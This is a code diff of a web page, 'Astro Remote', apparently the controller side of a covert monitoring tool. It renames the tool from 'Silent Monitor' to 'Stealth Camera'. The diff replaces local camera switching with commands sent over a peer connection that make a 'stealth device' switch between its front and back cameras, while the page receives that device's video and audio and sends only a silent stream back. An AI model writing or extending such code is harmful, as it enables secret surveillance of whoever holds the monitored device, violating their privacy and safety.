@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>Astro Remote - Silent Monitor</title>
+    <title>Astro Remote - Control Stealth Camera</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -67,7 +67,6 @@
             cursor: pointer; flex: 1; font-family: monospace;
         }
         .camera-btn:active { transform: scale(0.97); }
-        .camera-btn:disabled { opacity: 0.4; }
         .camera-btn.active { background: #ffd700; color: #1a1a2e; }
         .call-btn.end { background: #5a1e1e; border-color: #ff6b6b; color: #ff6b6b; }
         .call-btn:disabled { opacity: 0.4; }
@@ -127,8 +126,8 @@
             <button class="call-btn end" id="endCallBtn" disabled>🔴 Stop</button>
         </div>
         <div class="camera-controls" id="cameraControls" style="display: none;">
-            <button class="camera-btn" id="frontCameraBtn">📱 Remote Front Camera</button>
-            <button class="camera-btn" id="backCameraBtn">📷 Remote Back Camera</button>
+            <button class="camera-btn" id="frontCameraBtn">📱 Stealth Front Camera</button>
+            <button class="camera-btn" id="backCameraBtn">📷 Stealth Back Camera</button>
         </div>
         <div class="call-status" id="callStatus">⚫ Standby</div>
         <div class="video-container" id="videoContainer">
@@ -157,15 +156,9 @@
         let peer = null;
         let conn = null;
         let mediaCall = null;
-        let localStream = null;
-        let currentCamera = 'front';
         let isVideoMode = false;
         let keepAliveInterval = null;
-        
-        // Camera device IDs
-        let frontCameraId = null;
-        let backCameraId = null;
-        let cameraDetectionDone = false;
+        let currentStealthCamera = 'front';
 
         const connectBtn    = document.getElementById('connectBtn');
         const audioOnlyBtn  = document.getElementById('audioOnlyBtn');
@@ -179,176 +172,31 @@
         const videoContainer = document.getElementById('videoContainer');
         const remoteVideo   = document.getElementById('remoteVideo');
 
-        // Detect cameras and get their device IDs
-        async function detectCameras() {
-            try {
-                // Request permission first
-                await navigator.mediaDevices.getUserMedia({ video: true });
-                
-                const devices = await navigator.mediaDevices.enumerateDevices();
-                const cameras = devices.filter(d => d.kind === "videoinput");
-                
-                console.log(`[REMOTE] Found ${cameras.length} cameras:`);
-                cameras.forEach((cam, i) => {
-                    console.log(`  Camera ${i + 1}: ${cam.label || 'Unnamed'} - ID: ${cam.deviceId.substring(0, 20)}...`);
-                });
-                
-                // Identify front and back cameras by label
-                for (const cam of cameras) {
-                    const label = cam.label.toLowerCase();
-                    if (label.includes("back") || label.includes("rear") || label.includes("environment")) {
-                        backCameraId = cam.deviceId;
-                        console.log(`[REMOTE] Identified BACK camera: ${cam.label}`);
-                    } else if (label.includes("front") || label.includes("user") || label.includes("face")) {
-                        frontCameraId = cam.deviceId;
-                        console.log(`[REMOTE] Identified FRONT camera: ${cam.label}`);
-                    }
-                }
-                
-                // Fallback: if labels don't help, assume first is front, second is back
-                if (!frontCameraId && cameras[0]) {
-                    frontCameraId = cameras[0].deviceId;
-                    console.log(`[REMOTE] Using first camera as FRONT`);
-                }
-                if (!backCameraId && cameras[1]) {
-                    backCameraId = cameras[1].deviceId;
-                    console.log(`[REMOTE] Using second camera as BACK`);
-                }
-                
-                cameraDetectionDone = true;
-                
-                if (frontCameraId) {
-                    console.log(`[REMOTE] Front camera ID: ${frontCameraId.substring(0, 20)}...`);
-                }
-                if (backCameraId) {
-                    console.log(`[REMOTE] Back camera ID: ${backCameraId.substring(0, 20)}...`);
-                }
-                
-            } catch (err) {
-                console.warn(`[REMOTE] Camera detection failed: ${err.message}`);
-                cameraDetectionDone = false;
-            }
-        }
-
-        // Get camera stream using deviceId (most reliable method)
-        async function getRemoteCameraStream(useBackCamera) {
-            // Stop old stream first
-            if (localStream) {
-                localStream.getTracks().forEach(track => track.stop());
-            }
-            
-            // Ensure we have camera IDs
-            if (!cameraDetectionDone) {
-                await detectCameras();
-            }
-            
-            const targetDeviceId = useBackCamera ? backCameraId : frontCameraId;
-            
-            // Method 1: Use exact deviceId if available
-            if (targetDeviceId) {
-                try {
-                    console.log(`[REMOTE] Trying ${useBackCamera ? 'BACK' : 'FRONT'} camera with deviceId`);
-                    const stream = await navigator.mediaDevices.getUserMedia({
-                        audio: false,
-                        video: {
-                            deviceId: { exact: targetDeviceId },
-                            width: { ideal: 640 },
-                            height: { ideal: 480 }
-                        }
-                    });
-                    
-                    const videoTrack = stream.getVideoTracks()[0];
-                    const settings = videoTrack.getSettings();
-                    console.log(`[REMOTE] ${useBackCamera ? 'BACK' : 'FRONT'} camera acquired via deviceId`);
-                    console.log(`[REMOTE] Camera settings:`, settings);
-                    
-                    return stream;
-                    
-                } catch (err) {
-                    console.warn(`[REMOTE] deviceId method failed: ${err.message}`);
-                }
-            }
-            
-            // Method 2: Use facingMode with exact constraint
-            try {
-                console.log(`[REMOTE] Trying ${useBackCamera ? 'BACK' : 'FRONT'} camera with exact facingMode`);
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    audio: false,
-                    video: {
-                        facingMode: { exact: useBackCamera ? "environment" : "user" },
-                        width: { ideal: 640 },
-                        height: { ideal: 480 }
-                    }
-                });
-                
-                const videoTrack = stream.getVideoTracks()[0];
-                const settings = videoTrack.getSettings();
-                console.log(`[REMOTE] ${useBackCamera ? 'BACK' : 'FRONT'} camera acquired via facingMode`);
-                console.log(`[REMOTE] Camera settings:`, settings);
-                
-                return stream;
-                
-            } catch (err) {
-                console.warn(`[REMOTE] Exact facingMode failed: ${err.message}`);
-            }
-            
-            // Method 3: Fallback to any camera
-            console.log(`[REMOTE] Falling back to default camera`);
-            return await navigator.mediaDevices.getUserMedia({
-                audio: false,
-                video: { width: { ideal: 640 }, height: { ideal: 480 } }
-            });
-        }
-
-        // Switch remote's own camera
-        async function switchRemoteCamera(targetCamera) {
-            if (!isVideoMode || !mediaCall) {
-                callStatus.innerText = '⚠️ Start video monitor first';
+        // Send command to stealth device to switch camera
+        function switchStealthCamera(camera) {
+            if (!conn || !conn.open) {
+                callStatus.innerText = '❌ Not connected to stealth device';
                 return;
             }
-            if (targetCamera === currentCamera) return;
+
+            console.log(`[REMOTE] Sending switch command to stealth: ${camera}`);
+            conn.send({
+                type: 'switchCamera',
+                camera: camera
+            });
+
+            currentStealthCamera = camera;
+
+            frontCameraBtn.classList.toggle('active', camera === 'front');
+            backCameraBtn.classList.toggle('active', camera === 'back');
             
-            const useBackCamera = (targetCamera === 'back');
-            callStatus.innerText = `🔄 Switching to ${targetCamera} camera...`;
+            callStatus.innerText = `📷 Sending command: Switch to ${camera} camera`;
             
-            try {
-                const newStream = await getRemoteCameraStream(useBackCamera);
-                
-                if (mediaCall.peerConnection) {
-                    const senders = mediaCall.peerConnection.getSenders();
-                    const videoSender = senders.find(s => s.track && s.track.kind === 'video');
-                    if (videoSender && newStream.getVideoTracks()[0]) {
-                        await videoSender.replaceTrack(newStream.getVideoTracks()[0]);
-                        console.log(`[REMOTE] Video track replaced successfully`);
-                    }
+            setTimeout(() => {
+                if (callStatus.innerText.includes('Sending command')) {
+                    callStatus.innerText = `👁️ ${isVideoMode ? 'Video + Audio' : 'Audio Only'} monitor ACTIVE`;
                 }
-                
-                localStream = newStream;
-                currentCamera = targetCamera;
-                
-                frontCameraBtn.classList.toggle('active', currentCamera === 'front');
-                backCameraBtn.classList.toggle('active', currentCamera === 'back');
-                
-                // Log actual camera being used
-                const videoTrack = localStream.getVideoTracks()[0];
-                if (videoTrack) {
-                    const settings = videoTrack.getSettings();
-                    console.log(`[REMOTE] Active camera settings:`, settings);
-                    callStatus.innerText = `📹 Remote ${currentCamera} camera ACTIVE (${settings.facingMode || 'unknown'})`;
-                } else {
-                    callStatus.innerText = `📹 Remote ${currentCamera} camera ACTIVE`;
-                }
-                
-                setTimeout(() => {
-                    if (callStatus.innerText.includes('Switching')) {
-                        callStatus.innerText = `👁️ ${isVideoMode ? 'Video + Audio' : 'Audio Only'} monitor ACTIVE`;
-                    }
-                }, 2000);
-                
-            } catch (err) {
-                console.error(`[REMOTE] Camera switch failed:`, err);
-                callStatus.innerText = `❌ Camera switch failed: ${err.message}`;
-            }
+            }, 1500);
         }
 
         // Prevent screen lock
@@ -418,26 +266,22 @@
                 isVideoMode = withVideo;
                 callStatus.innerText = `📡 Starting ${withVideo ? 'video' : 'audio'} monitor...`;
 
+                // Remote sends a silent stream (no audio, optional tiny video)
                 let streamToSend = null;
                 
                 if (withVideo) {
-                    // Detect cameras first
-                    await detectCameras();
-                    
-                    streamToSend = await getRemoteCameraStream(false);
-                    localStream = streamToSend;
-                    currentCamera = 'front';
+                    try {
+                        streamToSend = await navigator.mediaDevices.getUserMedia({
+                            audio: false,
+                            video: { width: { ideal: 160 }, height: { ideal: 120 } }
+                        });
+                    } catch (e) {
+                        streamToSend = await makeSilentAudioStream();
+                    }
                     videoContainer.classList.add('active');
                     cameraControls.style.display = 'flex';
                     frontCameraBtn.classList.add('active');
                     backCameraBtn.classList.remove('active');
-                    
-                    // Log camera info
-                    const videoTrack = localStream.getVideoTracks()[0];
-                    if (videoTrack) {
-                        const settings = videoTrack.getSettings();
-                        console.log(`[REMOTE] Initial camera settings:`, settings);
-                    }
                 } else {
                     streamToSend = await makeSilentAudioStream();
                     cameraControls.style.display = 'none';
@@ -476,10 +320,6 @@
         }
 
         function endCall() {
-            if (localStream) {
-                localStream.getTracks().forEach(t => t.stop());
-                localStream = null;
-            }
             if (mediaCall) { 
                 mediaCall.close(); 
                 mediaCall = null; 
@@ -536,19 +376,16 @@
             });
             
             preventScreenLock();
-            
-            // Pre-detect cameras on page load
-            navigator.mediaDevices.enumerateDevices().then(() => {
-                detectCameras();
-            });
         }
 
         connectBtn.addEventListener('click', connectToPartner);
         audioOnlyBtn.addEventListener('click', () => startCall(false));
         videoCallBtn.addEventListener('click', () => startCall(true));
         endCallBtn.addEventListener('click', endCall);
-        frontCameraBtn.addEventListener('click', () => switchRemoteCamera('front'));
-        backCameraBtn.addEventListener('click', () => switchRemoteCamera('back'));
+        
+        // These buttons now send commands to stealth device
+        frontCameraBtn.addEventListener('click', () => switchStealthCamera('front'));
+        backCameraBtn.addEventListener('click', () => switchStealthCamera('back'));
 
         window.addEventListener('beforeunload', () => {
             if (keepAliveInterval) clearInterval(keepAliveInterval);
